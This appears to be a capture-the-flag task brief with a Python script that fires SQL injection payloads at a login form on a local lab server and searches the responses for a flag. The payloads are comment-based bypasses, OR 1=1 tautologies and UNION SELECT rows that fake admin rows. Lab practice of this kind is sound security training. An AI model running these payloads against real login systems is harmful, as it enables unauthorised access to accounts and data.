# Objective and context

Write a Python script to systematically test SQL injection payloads against the login form at http://127.0.0.1:32895/index.php

The script should:
1. Test various SQL comment syntaxes with proper URL encoding
2. Test authentication bypass patterns
3. Test with different username values (admin, root, Administrator, etc.)
4. Look for FLAG{} pattern or successful authentication indicators in responses
5. Test UNION SELECT to manipulate the admin check

Key payloads to test:
- admin'-- (space after --)
- admin'-- -
- admin'#
- admin'/*
- ' OR 1=1-- -
- admin' OR '1'='1
- admin' OR 1=1#
- UNION SELECT payloads with admin field manipulation

Print clear output showing which payloads work and any FLAG found.

```python
import requests
import urllib.parse

target = "http://127.0.0.1:32895/index.php"

# Test payloads
payloads = [
    ("admin'-- ", "x"),
    ("admin'-- -", "x"),
    ("admin'--+-", "x"),
    ("admin'#", "x"),
    ("admin'/*", "x"),
    ("admin' OR '1'='1'-- -", "x"),
    ("admin' OR 1=1#", "x"),
    ("' OR 1=1-- -", "' OR 1=1-- -"),
    ("admin", "' OR '1'='1"),
    ("admin' AND 1=1-- -", "x"),
]

print("Testing SQL injection payloads...")
for user, pwd in payloads:
    params = {'username': user, 'password': pwd}
    resp = requests.get(target, params=params)
    
    # Check for success indicators
    if "FLAG{" in resp.text:
        print(f"\n[SUCCESS] FLAG FOUND with username={user}, password={pwd}")
        print(f"Response: {resp.text}")
        break
    elif "not the admin" not in resp.text and "Login" not in resp.text:
        print(f"\n[INTERESTING] Different response with username={user}, password={pwd}")
        print(f"Response snippet: {resp.text[:500]}")
    else:
        print(f"[FAIL] username={user}, password={pwd} - Standard rejection")

# If no flag found, try more sophisticated payloads
print("\n\nTrying UNION SELECT to inject admin privileges...")
union_payloads = [
    "admin' UNION SELECT 'admin','pass',1-- -",
    "admin' UNION SELECT 'admin','pass',1,1-- -",
    "' UNION SELECT 'admin','x',1-- -",
]

for payload in union_payloads:
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    if "FLAG{" in resp.text:
        print(f"[SUCCESS] FLAG FOUND with payload: {payload}")
        print(f"Response: {resp.text}")
        break
    print(f"Tested: {payload} - {'Success' if 'not the admin' not in resp.text else 'Failed'}")
```


